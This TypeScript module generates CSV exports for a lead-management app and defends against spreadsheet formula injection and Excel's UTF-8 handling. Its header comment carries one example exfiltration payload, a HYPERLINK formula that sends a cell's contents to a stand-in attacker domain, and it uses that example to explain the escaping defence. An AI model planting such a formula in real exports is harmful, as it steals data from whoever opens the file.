// lib/csv.ts
//
// CSV generation for the exports in PLAN.md section 7. Two things here are not obvious and
// both are the reason this is a shared module rather than three inline `.join(',')` calls.
//
// 1. FORMULA INJECTION. A cell whose text begins with = + - @ (or tab / CR) is interpreted
//    as a *formula* by Excel and Google Sheets, not as text. Lead descriptions and names in
//    this app are free text typed by brokers and, via web-form and IndiaMART intake
//    (PLAN.md section 3), partly by strangers. So a lead named
//    `=HYPERLINK("https://evil.tld?d="&A1,"Click")` becomes a live exfiltration link the
//    moment an admin opens the export. The mitigation is to prefix a risky cell with a
//    single quote, which Excel strips on display and treats as "this is text".
//    This is the export equivalent of the SQL-injection care taken elsewhere in the schema,
//    and it is the reason exports do not just get built ad hoc at each call site.
//
// 2. EXCEL AND UTF-8. Excel will not detect UTF-8 in a .csv without a byte-order mark, so
//    a name in Bengali or Hindi (PLAN.md section 12 item 6 makes both first-class) opens as
//    mojibake. The BOM below is what makes 'প্রিয়া' survive the round trip.

/** Characters that make a spreadsheet treat a cell as a formula rather than as text. */
const FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r"]

function escapeCell(value: unknown): string {
  if (value === null || value === undefined) return ""

  let text = String(value)

  // Neutralise the formula, then quote for CSV. Order matters: prefixing first means the
  // quote itself is inside the quoted field and survives parsing.
  if (FORMULA_PREFIXES.some((p) => text.startsWith(p))) {
    text = `'${text}`
  }

  // A field needs quoting if it contains the delimiter, a quote, or any newline. Inner
  // quotes are doubled, per RFC 4180.
  if (/[",\n\r]/.test(text)) {
    return `"${text.replace(/"/g, '""')}"`
  }
  return text
}

export interface CsvColumn<T> {
  header: string
  /** Return a primitive. Formatting for humans belongs here, not in the caller's loop. */
  value: (row: T) => string | number | boolean | null | undefined
}

export function toCsv<T>(rows: T[], columns: CsvColumn<T>[]): string {
  const head = columns.map((c) => escapeCell(c.header)).join(",")
  const body = rows.map((row) => columns.map((c) => escapeCell(c.value(row))).join(","))
  // CRLF is what RFC 4180 specifies and what Excel is happiest with.
  return [head, ...body].join("\r\n")
}

/**
 * Triggers a browser download. `﻿` is the UTF-8 BOM -- see note 2 above.
 *
 * Capacitor note (Phase 4 in PLAN.md): inside the Android WebView a blob download does not
 * reach the system downloads folder. Export is an admin action done at a desk, so the web
 * path is the one that matters; if it ever needs to work in the wrapped app it wants
 * @capacitor/filesystem + Share rather than an anchor click.
 */
export function downloadCsv(filename: string, csv: string): void {
  const blob = new Blob(["﻿" + csv], { type: "text/csv;charset=utf-8;" })
  const url = URL.createObjectURL(blob)
  const link = document.createElement("a")
  link.href = url
  link.download = filename
  document.body.appendChild(link)
  link.click()
  document.body.removeChild(link)
  // Revoking immediately can cancel the download in some browsers; one tick is enough.
  setTimeout(() => URL.revokeObjectURL(url), 1000)
}

/** `leads-2026-08-17.csv` -- sortable, and unambiguous between locales. */
export function timestampedFilename(base: string): string {
  const d = new Date()
  const pad = (n: number) => String(n).padStart(2, "0")
  return `${base}-${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())}.csv`
}
